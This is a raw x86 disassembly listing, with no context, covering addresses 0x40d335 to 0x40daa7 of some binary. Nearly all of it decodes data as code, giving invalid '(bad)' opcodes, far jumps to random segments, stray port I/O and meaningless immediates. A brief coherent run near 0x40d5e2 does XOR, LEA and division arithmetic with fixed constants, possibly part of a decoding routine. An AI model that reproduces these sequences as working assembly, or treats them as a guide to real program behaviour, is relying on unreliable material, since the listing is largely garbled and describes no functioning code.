  40d335:	leave  
  40d336:	adc    BYTE PTR [edx+0x446c17e3],0x4b
  40d33d:	add    dh,BYTE PTR [eax]
  40d33f:	dec    ecx
  40d340:	cld    
  40d341:	lahf   
  40d342:	xchg   ebx,eax
  40d343:	push   esi
  40d344:	push   esp
  40d345:	repz xchg ecx,eax
  40d348:	lock cmp cl,BYTE PTR gs:[edi+ebp*1]
  40d34d:	jecxz  0x40d37f
  40d34f:	cli    
  40d350:	ret    0xd107
  40d353:	mov    edi,0xe81736ae
  40d358:	jb     0x40d3bd
  40d35a:	inc    edx
  40d35b:	fcom   QWORD PTR [ebx]
  40d35d:	mov    esi,0x413627d0
  40d362:	push   es
  40d363:	test   dh,0x39
  40d366:	fidivr WORD PTR [edx-0x4b9efb68]
  40d36c:	push   ss
  40d36d:	test   esi,eax
  40d36f:	pop    edi
  40d370:	push   edi
  40d371:	lds    eax,FWORD PTR [ecx-0x5c]
  40d374:	lahf   
  40d375:	mov    ebp,0x6f6016e9
  40d37a:	jmp    0x40d303
  40d37c:	jge    0x40d3ad
  40d37e:	pop    edi
  40d37f:	bound  esi,QWORD PTR [ecx+0x14]
  40d382:	jb     0x40d3c7
  40d384:	(bad)  
  40d385:	sbb    BYTE PTR [eax],cl
  40d387:	ret    
  40d388:	xor    edx,ebx
  40d38a:	push   edi
  40d38b:	sub    cl,BYTE PTR ds:0x581adf0b
  40d391:	bound  ecx,QWORD PTR [ecx+edx*2-0x29d14343]
  40d398:	xor    al,BYTE PTR [edi+edx*8+0x1c]
  40d39c:	sbb    DWORD PTR [ebx],0x17b33bce
  40d3a2:	cmc    
  40d3a3:	(bad)  
  40d3a4:	loope  0x40d3bd
  40d3a6:	mov    esi,0x85287aac
  40d3ab:	xchg   ebx,eax
  40d3ac:	cmc    
  40d3ad:	pop    edi
  40d3ae:	mov    al,ds:0x1ec22bdf
  40d3b3:	or     ebp,DWORD PTR [esi]
  40d3b5:	mov    ah,0x5d
  40d3b7:	sbb    dh,BYTE PTR [esi-0x99107d9]
  40d3bd:	pushf  
  40d3be:	mov    cl,0x7c
  40d3c0:	jle    0x40d38e
  40d3c2:	cld    
  40d3c3:	stc    
  40d3c4:	fcom   QWORD PTR [ebp+0x7]
  40d3c7:	call   0x6445:0x4ece263a
  40d3ce:	mov    esi,0xc2ee88aa
  40d3d3:	sbb    ebx,esi
  40d3d5:	out    0x92,eax
  40d3d7:	mov    BYTE PTR [edi],al
  40d3d9:	test   DWORD PTR [ebx+0x3737da75],ebx
  40d3df:	nop
  40d3e0:	jmp    0x40d3ad
  40d3e2:	dec    edx
  40d3e3:	and    edi,ebx
  40d3e5:	sub    al,0xd1
  40d3e7:	sbb    dl,BYTE PTR [ecx-0x4b]
  40d3ea:	fisttp QWORD PTR ds:0xa63237a4
  40d3f0:	mov    WORD PTR [edi+eax*8],ds
  40d3f3:	adc    al,0x34
  40d3f5:	rcr    al,cl
  40d3f7:	push   esi
  40d3f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3f9:	(bad)  
  40d3fa:	jmp    0xca35:0x99af2188
  40d401:	in     al,dx
  40d402:	mov    DWORD PTR [edx-0x51f588b9],0x1397cd68
  40d40c:	xchg   edx,eax
  40d40d:	and    eax,0x25228274
  40d412:	dec    ebp
  40d413:	and    eax,0xdecf057
  40d418:	mov    ah,0xfb
  40d41a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d41b:	ins    BYTE PTR es:[edi],dx
  40d41c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d41d:	cmp    DWORD PTR [edi],ebx
  40d41f:	fnstsw WORD PTR [edx-0x7f8751e7]
  40d425:	aas    
  40d426:	push   edx
  40d427:	sub    DWORD PTR [eax],ebx
  40d429:	or     bl,BYTE PTR [ecx-0x29f438cd]
  40d42f:	push   es
  40d430:	or     al,0x89
  40d432:	push   esp
  40d433:	shl    BYTE PTR ds:0x4e8157cb,0xbb
  40d43a:	sti    
  40d43b:	cs pop es
  40d43d:	nop
  40d43e:	loop   0x40d411
  40d440:	push   es
  40d441:	inc    esp
  40d442:	repz inc bp
  40d445:	jmp    0xf8e7db2c
  40d44a:	cs pop esi
  40d44c:	fwait
  40d44d:	dec    ebx
  40d44e:	or     edi,ebp
  40d450:	cmp    ebp,DWORD PTR [ebp-0x70a560f7]
  40d456:	sbb    eax,0x12be94fd
  40d45b:	ins    DWORD PTR es:[edi],dx
  40d45c:	in     al,0xd1
  40d45e:	push   esp
  40d45f:	fwait
  40d460:	lahf   
  40d461:	dec    ecx
  40d462:	lods   eax,DWORD PTR ds:[esi]
  40d463:	pop    ebx
  40d464:	or     eax,0x3d7762ac
  40d469:	sub    BYTE PTR [edx],0xbd
  40d46c:	jecxz  0x40d40d
  40d46e:	jmp    0xb078:0xb2ac92f4
  40d475:	pop    eax
  40d476:	cs pop ecx
  40d478:	sub    al,0xec
  40d47a:	mov    BYTE PTR [esi],ah
  40d47c:	je     0x40d459
  40d47e:	or     ebp,DWORD PTR [edx-0x29ba49de]
  40d484:	push   esi
  40d485:	int3   
  40d486:	inc    esi
  40d487:	mov    ah,BYTE PTR [ebp-0x305dbdea]
  40d48d:	inc    ecx
  40d48e:	cli    
  40d48f:	cmp    al,0x32
  40d491:	sbb    al,0x64
  40d493:	int    0x79
  40d495:	xor    DWORD PTR [ebx],0xfbb9dc1d
  40d49b:	shl    DWORD PTR [ecx+edx*8+0x4d],1
  40d49f:	rcr    DWORD PTR [esi],cl
  40d4a1:	push   0x27
  40d4a3:	popa   
  40d4a4:	sub    esp,DWORD PTR [ebx+0x47]
  40d4a7:	xchg   DWORD PTR [esp+edi*1+0x61],ebp
  40d4ab:	int    0xdb
  40d4ad:	into   
  40d4ae:	ss inc ebp
  40d4b0:	pushf  
  40d4b1:	enter  0x9b51,0xba
  40d4b5:	nop
  40d4b6:	adc    dh,BYTE PTR [ebp-0x16947961]
  40d4bc:	ret    0x3d37
  40d4bf:	mov    esp,0xb8e8ce95
  40d4c4:	add    DWORD PTR [edi-0x656eb738],ebx
  40d4ca:	sub    DWORD PTR cs:[esi],ecx
  40d4cd:	or     BYTE PTR [edx+0x2a],cl
  40d4d0:	xchg   BYTE PTR [edx+0x70],ch
  40d4d3:	ins    BYTE PTR es:[edi],dx
  40d4d4:	sub    BYTE PTR [ebx],0x25
  40d4d7:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4d9:	stos   BYTE PTR es:[edi],al
  40d4da:	shr    BYTE PTR [esi],0xd2
  40d4dd:	mov    bh,0xc1
  40d4df:	push   ss
  40d4e0:	aaa    
  40d4e1:	or     al,0xe6
  40d4e3:	cli    
  40d4e4:	popf   
  40d4e5:	inc    esp
  40d4e6:	(bad)  
  40d4e7:	ds jmp 0x40d517
  40d4ea:	cmp    dl,BYTE PTR [ebp+0x22b2ee61]
  40d4f0:	add    al,0xb1
  40d4f2:	inc    eax
  40d4f3:	adc    esi,ebx
  40d4f5:	sbb    eax,eax
  40d4f7:	inc    eax
  40d4f8:	cdq    
  40d4f9:	les    ebp,FWORD PTR ds:0xf608cf6d
  40d4ff:	out    dx,al
  40d500:	(bad)  
  40d501:	pop    ds
  40d502:	lods   eax,DWORD PTR ds:[esi]
  40d503:	in     al,dx
  40d504:	push   ecx
  40d505:	in     eax,dx
  40d506:	pop    ebx
  40d507:	or     eax,0xdda9e120
  40d50c:	outs   dx,DWORD PTR ds:[esi]
  40d50d:	push   ds
  40d50e:	jnp    0x40d4ea
  40d510:	(bad)  
  40d511:	int3   
  40d512:	stos   BYTE PTR es:[edi],al
  40d513:	and    DWORD PTR [esi],0xfffffff1
  40d516:	enter  0x60c,0x26
  40d51a:	or     BYTE PTR [ebx],al
  40d51c:	mov    dl,0x51
  40d51e:	pop    edx
  40d51f:	mov    ecx,0x760ab6d2
  40d524:	xchg   edi,esi
  40d526:	mov    al,0x51
  40d528:	fstp   QWORD PTR [edi]
  40d52a:	mov    bh,0x36
  40d52c:	add    al,BYTE PTR [eax]
  40d52e:	jno    0x40d564
  40d530:	es out 0x22,al
  40d533:	adc    eax,DWORD PTR [edx]
  40d535:	cmc    
  40d536:	outs   dx,DWORD PTR ds:[esi]
  40d537:	xchg   edi,eax
  40d538:	mov    esi,0x20cfa3ae
  40d53d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d53e:	pop    ss
  40d53f:	xchg   esi,eax
  40d540:	dec    ebx
  40d541:	sar    BYTE PTR [edx],1
  40d543:	cli    
  40d544:	fbld   TBYTE PTR [ecx]
  40d546:	retf   
  40d547:	xchg   ebx,eax
  40d548:	pop    esi
  40d549:	inc    ebp
  40d54a:	into   
  40d54b:	cmp    bh,BYTE PTR [ebp+0x76c39dee]
  40d551:	outs   dx,DWORD PTR ds:[esi]
  40d552:	dec    ecx
  40d553:	mov    dh,0xd0
  40d555:	dec    ebx
  40d556:	xchg   edx,eax
  40d557:	nop
  40d558:	pop    eax
  40d559:	gs int 0xb2
  40d55c:	add    edx,DWORD PTR [ecx]
  40d55e:	loope  0x40d4e6
  40d560:	dec    eax
  40d561:	mov    eax,ds:0xd90237f4
  40d566:	call   0x5bf3:0x8eebb8ee
  40d56d:	pushf  
  40d56e:	mov    dh,bl
  40d570:	(bad)  
  40d571:	icebp  
  40d572:	jl     0x40d56f
  40d574:	scas   al,BYTE PTR es:[edi]
  40d575:	int    0xcf
  40d577:	pop    ss
  40d578:	push   edi
  40d579:	aas    
  40d57a:	mov    edi,0xd8836ff1
  40d57f:	push   ecx
  40d580:	int3   
  40d581:	ret    
  40d582:	sar    DWORD PTR [ebp+0x5a4ba020],0x4e
  40d589:	dec    eax
  40d58a:	pusha  
  40d58b:	loope  0x40d538
  40d58d:	imul   esp,DWORD PTR [edx],0x41
  40d590:	test   DWORD PTR [edi-0x20],esp
  40d593:	push   eax
  40d594:	jecxz  0x40d5d4
  40d596:	push   es
  40d597:	ficom  DWORD PTR [eax]
  40d599:	adc    BYTE PTR [ebx-0x55613108],bl
  40d59f:	in     ax,dx
  40d5a1:	xchg   edi,eax
  40d5a2:	sbb    al,0x40
  40d5a4:	xor    eax,0xc5c3cfef
  40d5a9:	shl    DWORD PTR [edx],cl
  40d5ab:	inc    esp
  40d5ac:	arpl   WORD PTR [eax+0x2b],cx
  40d5af:	dec    ebx
  40d5b0:	inc    eax
  40d5b1:	aam    0x15
  40d5b3:	fidivr DWORD PTR [eax-0x1f434648]
  40d5b9:	(bad)  
  40d5bb:	xchg   ebp,eax
  40d5bc:	hlt    
  40d5bd:	jle    0x40d566
  40d5bf:	ja     0x40d583
  40d5c1:	mov    ebx,0x163f872c
  40d5c6:	inc    ebx
  40d5c7:	aaa    
  40d5c8:	push   edi
  40d5c9:	or     al,0xf5
  40d5cb:	xor    eax,0xa2f00bc3
  40d5d0:	leave  
  40d5d1:	mov    ah,0x20
  40d5d3:	(bad)  
  40d5d4:	fdiv   DWORD PTR [edx+0x3df2f083]
  40d5da:	sub    ch,ah
  40d5dc:	out    0x3c,al
  40d5de:	pop    esp
  40d5df:	imul   eax,DWORD PTR [edx]
  40d5e2:	mov    edx,DWORD PTR [ebp-0x4]
  40d5e5:	xor    edx,ecx
  40d5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5ea:	lea    ecx,[edx+ecx*1+0x32729b]
  40d5f1:	cmp    ecx,eax
  40d5f3:	je     0x40dfca
  40d5f9:	mov    edi,DWORD PTR [ebp-0x18]
  40d5fc:	mov    eax,DWORD PTR [ebp+0x8]
  40d5ff:	mov    edx,DWORD PTR [ebp+0x14]
  40d602:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d606:	mov    ecx,0x7510854
  40d60b:	xor    edx,edx
  40d60d:	xor    edi,ecx
  40d60f:	mov    esi,0x32729b
  40d614:	add    edi,esi
  40d616:	div    edi
  40d618:	mov    edx,DWORD PTR [ebp-0x4]
  40d61b:	jmp    0x40d93b
  40d620:	inc    ecx
  40d621:	stos   BYTE PTR es:[edi],al
  40d622:	push   ss
  40d623:	jmp    0x40d61a
  40d625:	jae    0x40d688
  40d627:	mov    al,0xbf
  40d629:	jo     0x40d5c5
  40d62b:	jecxz  0x40d5dc
  40d62d:	or     esi,DWORD PTR [ecx+0x3a]
  40d630:	sub    edx,DWORD PTR [eax+0x7d7d7e7e]
  40d636:	jle    0x40d6b6
  40d638:	outs   dx,BYTE PTR ds:[esi]
  40d639:	push   esp
  40d63a:	xor    DWORD PTR [edi+ebx*1+0x2f],ecx
  40d63e:	test   BYTE PTR [esi+0x594e486c],dh
  40d644:	and    edi,DWORD PTR [ebp+ebx*2+0x4e]
  40d648:	mov    ah,0xac
  40d64a:	inc    ebp
  40d64b:	sbb    BYTE PTR [esi+0x66339b41],0x99
  40d652:	and    eax,0xdbe0878e
  40d657:	aaa    
  40d658:	rol    dl,0xb1
  40d65b:	leave  
  40d65c:	into   
  40d65d:	inc    ebx
  40d65e:	sbb    ecx,DWORD PTR [di-0x3]
  40d662:	jo     0x40d632
  40d664:	jno    0x40d6ab
  40d666:	mov    dh,0xaa
  40d668:	out    0xed,al
  40d66a:	in     al,0x36
  40d66c:	(bad)  
  40d66e:	aaa    
  40d66f:	dec    edx
  40d670:	xor    al,0x42
  40d672:	jp     0x40d68a
  40d674:	retf   0x734b
  40d677:	mov    esp,0x6da30af1
  40d67c:	repnz sbb ch,dh
  40d67f:	shr    BYTE PTR [ebx+edi*8],cl
  40d682:	je     0x40d6a8
  40d684:	mov    eax,0x64705c0
  40d689:	nop
  40d68a:	popa   
  40d68b:	mov    esi,eax
  40d68d:	mov    cl,0x24
  40d68f:	or     al,0x1d
  40d691:	inc    si
  40d693:	imul   ecx,DWORD PTR [ebx],0x50b38222
  40d699:	jnp    0x40d6de
  40d69b:	jmp    0x5f0d:0xc7dfba88
  40d6a2:	xchg   esp,eax
  40d6a3:	mov    al,ds:0xc7dd7ea
  40d6a8:	adc    al,0x74
  40d6aa:	inc    edx
  40d6ab:	test   al,0xb4
  40d6ad:	nop
  40d6ae:	push   ebp
  40d6af:	sbb    DWORD PTR [ebp-0x3f],ecx
  40d6b2:	jmp    0x67f0d297
  40d6b7:	aad    0x30
  40d6b9:	data16 int3 
  40d6bb:	jge    0x40d724
  40d6bd:	sar    BYTE PTR [ecx-0x23dc070e],1
  40d6c3:	jp     0x40d738
  40d6c5:	mov    ebp,0xfeaf22a3
  40d6ca:	pusha  
  40d6cb:	ins    BYTE PTR es:[edi],dx
  40d6cc:	push   ecx
  40d6cd:	int3   
  40d6ce:	std    
  40d6cf:	int3   
  40d6d0:	push   esp
  40d6d1:	mov    eax,0x6a82be02
  40d6d6:	and    ecx,edi
  40d6d8:	cmp    DWORD PTR ds:0x461a17ec,ebx
  40d6de:	xchg   ecx,eax
  40d6df:	sub    DWORD PTR [ecx],0xffffffa8
  40d6e2:	call   0x114044
  40d6e7:	mov    ebx,es
  40d6e9:	jecxz  0x40d70e
  40d6eb:	and    edx,eax
  40d6ed:	in     al,dx
  40d6ee:	adc    al,0x87
  40d6f0:	push   ss
  40d6f1:	test   eax,0xba524d45
  40d6f6:	cmp    DWORD PTR [ebp-0x61176fd2],0xffffffd6
  40d6fd:	and    al,0x17
  40d6ff:	(bad)  
  40d700:	xchg   esp,eax
  40d701:	ins    DWORD PTR es:[edi],dx
  40d702:	xchg   esp,eax
  40d703:	gs retf 0x2a9d
  40d707:	jmp    0x6add:0x4202d051
  40d70e:	sbb    ch,BYTE PTR [ebp+0x3a601c86]
  40d714:	scas   eax,DWORD PTR es:[edi]
  40d715:	jp     0x40d794
  40d717:	adc    eax,0xa5c95c8e
  40d71c:	inc    eax
  40d71d:	int    0xec
  40d71f:	mov    dl,0x74
  40d721:	test   BYTE PTR [ecx-0x50],ch
  40d724:	sbb    DWORD PTR [esi],0xddbbbcd9
  40d72a:	neg    DWORD PTR ds:0xbb125aa2
  40d730:	icebp  
  40d731:	dec    eax
  40d732:	push   edx
  40d733:	jae    0x40d711
  40d735:	rol    DWORD PTR [ecx],0x9e
  40d738:	xchg   bh,ch
  40d73a:	repnz inc eax
  40d73c:	cmp    eax,0x5085e920
  40d741:	dec    ebx
  40d742:	in     eax,0xaf
  40d744:	into   
  40d745:	dec    esp
  40d746:	ror    DWORD PTR [ebx+0x5c],1
  40d749:	fstp   DWORD PTR [edi-0x3eefc23d]
  40d74f:	je     0x40d725
  40d751:	sbb    DWORD PTR [edi],esp
  40d753:	lea    eax,[edx+0x1e]
  40d756:	ss cmp eax,0x697a272d
  40d75c:	mov    cl,0x2a
  40d75e:	pop    esp
  40d75f:	sub    al,0xe3
  40d761:	push   ss
  40d762:	inc    esp
  40d763:	and    al,0x67
  40d765:	ins    DWORD PTR es:[edi],dx
  40d766:	imul   ebx,esp,0x583c8ae1
  40d76c:	pop    ebp
  40d76d:	clc    
  40d76e:	mov    dl,0x37
  40d770:	hlt    
  40d771:	je     0x40d77d
  40d773:	push   ss
  40d774:	xchg   esi,eax
  40d775:	(bad)  
  40d776:	rol    BYTE PTR [ebx],0xc7
  40d779:	jno    0x40d7f5
  40d77b:	inc    esi
  40d77c:	js     0x40d708
  40d77e:	mov    eax,0x69e2a1ee
  40d783:	add    DWORD PTR [ebp-0x5f],ebp
  40d786:	xchg   ebp,eax
  40d787:	repz rcr DWORD PTR [ecx],0x77
  40d78b:	mov    WORD PTR [ecx+edx*4-0x4da0320d],gs
  40d792:	adc    dh,dl
  40d794:	mov    al,0x77
  40d796:	in     eax,0xc9
  40d798:	push   ebp
  40d799:	add    eax,DWORD PTR [ebx-0x1]
  40d79c:	and    BYTE PTR [ebx],bl
  40d79e:	push   ebx
  40d79f:	mov    ds:0xb3d1130f,al
  40d7a4:	pop    esi
  40d7a5:	mov    esi,0x293b2b62
  40d7aa:	les    edx,FWORD PTR [ecx+eiz*1+0x72]
  40d7ae:	sbb    ecx,edx
  40d7b0:	sub    dh,dl
  40d7b2:	stc    
  40d7b3:	cs mov al,0x4a
  40d7b6:	or     esi,edi
  40d7b8:	mov    BYTE PTR [ecx-0x500a8b24],0x52
  40d7bf:	ds test al,0x7
  40d7c2:	inc    esi
  40d7c3:	nop
  40d7c4:	test   DWORD PTR [edx+edx*8],ecx
  40d7c7:	aam    0x6d
  40d7c9:	add    BYTE PTR [ebx+0x41],dl
  40d7cc:	int    0xb0
  40d7ce:	jns    0x40d84b
  40d7d0:	(bad)  
  40d7d1:	adc    esp,ebp
  40d7d3:	clc    
  40d7d4:	sub    ecx,DWORD PTR [edx+0x5d96763a]
  40d7da:	lahf   
  40d7db:	test   DWORD PTR [ecx-0x744be1c4],esp
  40d7e1:	dec    esi
  40d7e2:	push   0xece0990
  40d7e7:	add    DWORD PTR [eax+0x26],ebp
  40d7ea:	iret   
  40d7eb:	mov    ds,WORD PTR [edi+esi*2]
  40d7ee:	dec    esi
  40d7ef:	cwde   
  40d7f0:	xor    eax,0xdfc2832
  40d7f5:	loope  0x40d7ce
  40d7f7:	repnz sub esi,DWORD PTR [ecx]
  40d7fa:	dec    ebp
  40d7fb:	outs   dx,DWORD PTR ds:[esi]
  40d7fc:	jae    0x40d7a4
  40d7fe:	add    dl,dh
  40d800:	dec    ebp
  40d801:	ins    BYTE PTR es:[edi],dx
  40d802:	sbb    DWORD PTR [eax-0x69b564e0],edx
  40d808:	in     eax,0x7a
  40d80a:	(bad)  
  40d80c:	add    al,0x6f
  40d80e:	outs   dx,DWORD PTR ds:[esi]
  40d80f:	shr    DWORD PTR [edx],0x55
  40d812:	xchg   esi,eax
  40d813:	jp     0x40d834
  40d815:	xchg   ebp,eax
  40d816:	pushf  
  40d817:	adc    DWORD PTR [ebx+0x54],0x69
  40d81b:	iret   
  40d81c:	fld    QWORD PTR [ebp+0x26]
  40d81f:	or     DWORD PTR [ebp-0x662be52f],edi
  40d825:	fcom   QWORD PTR [eax]
  40d827:	sub    ebp,DWORD PTR [ebx+0x47]
  40d82a:	sbb    bh,BYTE PTR [ebx-0x2a8a8f14]
  40d830:	out    dx,al
  40d831:	and    edi,DWORD PTR [edi]
  40d833:	imul   edi,DWORD PTR [esi],0xffffff85
  40d836:	loop   0x40d8ad
  40d838:	imul   edi,DWORD PTR [ebp+0x321d3641],0x54de0567
  40d842:	sbb    eax,0x4d608626
  40d847:	nop
  40d848:	aam    0xb2
  40d84a:	push   eax
  40d84b:	mov    ebx,?
  40d84d:	mov    ds:0x34e5bb01,eax
  40d852:	into   
  40d853:	add    al,0x5e
  40d855:	push   cs
  40d856:	icebp  
  40d857:	dec    ecx
  40d858:	jmp    0x40d800
  40d85a:	pop    edx
  40d85b:	jle    0x40d7fa
  40d85d:	mov    bh,0xc0
  40d85f:	adc    al,0x30
  40d861:	jmp    0x7a7:0xe75b497b
  40d868:	fwait
  40d869:	cli    
  40d86a:	mov    eax,ds:0x1f92ddf7
  40d86f:	and    BYTE PTR ds:0x88ad51c,0x8d
  40d876:	idiv   dl
  40d878:	or     eax,0x1cf9aa99
  40d87d:	xor    eax,0xb1b1765f
  40d882:	outs   dx,DWORD PTR ds:[esi]
  40d883:	lds    esi,FWORD PTR [edx]
  40d885:	sbb    BYTE PTR [eax+0xc],ch
  40d888:	push   ds
  40d889:	aad    0xaf
  40d88b:	push   es
  40d88c:	ror    ah,1
  40d88e:	dec    ebx
  40d88f:	inc    eax
  40d890:	push   esp
  40d891:	popa   
  40d892:	lods   eax,DWORD PTR ds:[esi]
  40d893:	test   al,0x81
  40d895:	in     eax,dx
  40d896:	test   al,0xc1
  40d898:	pop    esp
  40d899:	sbb    BYTE PTR [edi+ebp*8+0x374cdc48],0xe4
  40d8a1:	sbb    BYTE PTR [ebx+0x34ffebfe],bh
  40d8a7:	mov    bh,0x97
  40d8a9:	jo     0x40d926
  40d8ab:	or     DWORD PTR [esi-0x41],esi
  40d8ae:	hlt    
  40d8af:	push   ss
  40d8b0:	mov    eax,ds:0xed6219a3
  40d8b5:	jmp    0x402a:0xda286a9f
  40d8bc:	and    al,dl
  40d8be:	inc    ebp
  40d8bf:	rcl    DWORD PTR [ecx+0x25bb99fd],1
  40d8c5:	xor    BYTE PTR [esi-0x4f],ch
  40d8c8:	pop    ds
  40d8c9:	mov    dl,0xc2
  40d8cb:	enter  0x2da5,0xf2
  40d8cf:	cmp    al,0x4a
  40d8d1:	dec    ecx
  40d8d2:	xchg   BYTE PTR [ebx-0x1f],al
  40d8d5:	sbb    bh,0x4a
  40d8d8:	sbb    DWORD PTR [edi],ecx
  40d8da:	push   ss
  40d8db:	pop    ecx
  40d8dc:	jge    0x40d8af
  40d8de:	xchg   ecx,eax
  40d8df:	ret    
  40d8e0:	push   ds
  40d8e1:	in     eax,dx
  40d8e2:	call   0xf67b:0x9818af41
  40d8e9:	out    dx,al
  40d8ea:	das    
  40d8eb:	xchg   esi,eax
  40d8ec:	add    ebx,esp
  40d8ee:	sbb    edx,DWORD PTR [edi-0x6d85abe]
  40d8f4:	adc    BYTE PTR [eax+0x26],dl
  40d8f7:	cli    
  40d8f8:	repz das 
  40d8fa:	dec    esi
  40d8fb:	ja     0x40d950
  40d8fd:	xchg   esp,eax
  40d8fe:	lea    edi,ds:0x5e2340fe
  40d904:	push   edx
  40d905:	xor    DWORD PTR [ecx-0x46f54f],esi
  40d90b:	jmp    0xc7061f3c
  40d910:	add    al,0x41
  40d912:	scas   al,BYTE PTR es:[edi]
  40d913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d914:	jno    0x40d897
  40d916:	and    ebp,DWORD PTR [edi+esi*4]
  40d919:	out    dx,eax
  40d91a:	das    
  40d91b:	add    eax,DWORD PTR [ebp+0x63d615d1]
  40d921:	retf   
  40d922:	xchg   edi,eax
  40d923:	pop    ecx
  40d924:	mov    ch,0xe6
  40d926:	icebp  
  40d927:	jno    0x40d90f
  40d929:	mov    DWORD PTR [ebp+0x4f],ecx
  40d92c:	stos   DWORD PTR es:[edi],eax
  40d92d:	cwde   
  40d92e:	jo     0x40d8ef
  40d930:	jl     0x40d9af
  40d932:	cmp    eax,0x9a9a585e
  40d937:	jo     0x40d93d
  40d939:	leave  
  40d93a:	mov    ecx,0x848dd133
  40d93f:	add    bl,BYTE PTR [ebx-0x16ffcd8e]
  40d945:	sbb    eax,DWORD PTR [ebx]
  40d947:	add    BYTE PTR [eax],al
  40d949:	das    
  40d94a:	sub    BYTE PTR [ecx],0x25
  40d94d:	mov    cl,0xb5
  40d94f:	xor    edx,DWORD PTR [eax-0x2c802913]
  40d955:	(bad)  
  40d957:	outs   dx,BYTE PTR ds:[esi]
  40d958:	aaa    
  40d959:	ss lahf 
  40d95b:	jle    0x40d9db
  40d95d:	jge    0x40d9dc
  40d95f:	jle    0x40d9df
  40d961:	or     DWORD PTR [esi],edx
  40d963:	sbb    eax,0x3bebf68d
  40d968:	and    DWORD PTR [eax],ebx
  40d96a:	arpl   cx,si
  40d96c:	adc    DWORD PTR [edx-0xa6ae99a],edi
  40d972:	(bad)  
  40d973:	jne    0x40d8f5
  40d975:	push   edi
  40d976:	in     al,0x0
  40d978:	(bad)  
  40d979:	int3   
  40d97a:	lahf   
  40d97b:	and    bh,0x81
  40d97e:	jl     0x40d926
  40d980:	lods   eax,DWORD PTR ds:[esi]
  40d981:	pop    ss
  40d982:	xrelease mov DWORD PTR [ebx+0x29],esp
  40d986:	sub    eax,0x67657553
  40d98b:	xchg   ebx,eax
  40d98c:	and    ah,0x34
  40d98f:	imul   esi,DWORD PTR [eax],0xcb60b06a
  40d995:	cdq    
  40d996:	popf   
  40d997:	push   cx
  40d999:	push   0xfffffff4
  40d99b:	ja     0x40d959
  40d99d:	mov    edi,0x3a5ec5d9
  40d9a2:	js     0x40d99f
  40d9a4:	je     0x40d978
  40d9a6:	jmp    0x40d9b2
  40d9a8:	sbb    DWORD PTR [ebp-0x3f],edi
  40d9ab:	jmp    0xb01:0x36e03b48
  40d9b2:	push   0x148dfd3
  40d9b7:	or     al,BYTE PTR [ecx+0x56a1bbcc]
  40d9bd:	cmp    BYTE PTR [edi-0x66],bh
  40d9c0:	jg     0x40d9d4
  40d9c2:	xor    edi,DWORD PTR [ecx-0x58]
  40d9c5:	les    ebp,FWORD PTR [ecx]
  40d9c7:	push   es
  40d9c8:	nop
  40d9c9:	mov    WORD PTR [esi+0x1e8cad3b],cs
  40d9cf:	or     BYTE PTR es:[eax-0x66],0x77
  40d9d4:	mov    dl,0xbf
  40d9d6:	sahf   
  40d9d7:	loop   0x40da49
  40d9d9:	adc    esp,DWORD PTR [edi+ecx*8-0x287c99fd]
  40d9e0:	jbe    0x40da47
  40d9e2:	test   cl,ah
  40d9e4:	gs jns 0x40da1f
  40d9e7:	or     edx,DWORD PTR [esi+ecx*1-0x4e033765]
  40d9ee:	xchg   edi,eax
  40d9ef:	mov    DWORD PTR [eax],esp
  40d9f1:	inc    edx
  40d9f2:	leave  
  40d9f3:	je     0x40d9d5
  40d9f5:	sub    edx,esp
  40d9f7:	push   ss
  40d9f8:	imul   edx,DWORD PTR [ecx+0x3c],0x30
  40d9fc:	add    DWORD PTR [eax],eax
  40d9fe:	xchg   ecx,eax
  40d9ff:	cli    
  40da00:	lods   eax,DWORD PTR ds:[esi]
  40da01:	pop    ds
  40da02:	cmp    eax,0x48642cde
  40da07:	lods   eax,DWORD PTR ds:[esi]
  40da08:	or     BYTE PTR [eax+0x79],ch
  40da0b:	popa   
  40da0c:	add    BYTE PTR [eax],cl
  40da0e:	not    cl
  40da10:	add    esp,DWORD PTR [edi]
  40da12:	fwait
  40da13:	or     al,0x78
  40da15:	aaa    
  40da16:	(bad)  
  40da17:	cmp    eax,0x4c7c07e5
  40da1c:	or     DWORD PTR ds:0x46b13301,0x318c147a
  40da26:	and    eax,0x3faf60e8
  40da2b:	lods   al,BYTE PTR ds:[esi]
  40da2c:	push   edx
  40da2d:	fild   DWORD PTR [eax+0x809f98f]
  40da33:	jnp    0x40da31
  40da35:	rol    bh,1
  40da37:	data16 sbb al,0xbe
  40da3a:	mov    ebp,0x8c44b4cf
  40da3f:	stos   BYTE PTR es:[edi],al
  40da40:	aas    
  40da41:	inc    edi
  40da42:	daa    
  40da43:	or     eax,0x45b94c97
  40da48:	aaa    
  40da49:	scas   al,BYTE PTR es:[edi]
  40da4a:	cmp    eax,0x738be298
  40da4f:	loop   0x40da42
  40da51:	adc    DWORD PTR [edi+0x2f],eax
  40da54:	mov    ebx,0xc501848b
  40da59:	sub    eax,0x97b8528c
  40da5e:	jmp    0x904e:0xb4970af5
  40da65:	dec    eax
  40da66:	in     al,0xd2
  40da68:	inc    edx
  40da69:	dec    esp
  40da6a:	xchg   edi,eax
  40da6b:	outs   dx,DWORD PTR ds:[esi]
  40da6c:	idiv   BYTE PTR [edx+eax*4]
  40da6f:	js     0x40da87
  40da71:	mov    BYTE PTR [ecx+0xe],cl
  40da74:	pop    es
  40da75:	test   al,0x8d
  40da77:	sbb    dl,dl
  40da79:	clc    
  40da7a:	arpl   WORD PTR [ebx],cx
  40da7c:	in     al,dx
  40da7d:	cdq    
  40da7e:	mov    al,0x17
  40da80:	hlt    
  40da81:	pop    ds
  40da82:	xchg   edx,eax
  40da83:	arpl   WORD PTR [esi+0x76],di
  40da86:	ds in  eax,dx
  40da88:	xchg   ebx,eax
  40da89:	shl    DWORD PTR [eax+0x7d80b25a],0x70
  40da90:	jb     0x40dafa
  40da92:	lea    ecx,[ebx-0x5c]
  40da95:	xor    edi,ebx
  40da97:	xchg   ebx,eax
  40da98:	mov    eax,ds:0xd3b0189
  40da9d:	push   edi
  40da9e:	in     al,dx
  40da9f:	(bad)  
  40daa0:	std    
  40daa1:	and    al,0xc9
  40daa3:	add    al,0x2e
  40daa5:	out    0x91,al
  40daa7:	imul   ebx,ecx,0xffffffd9
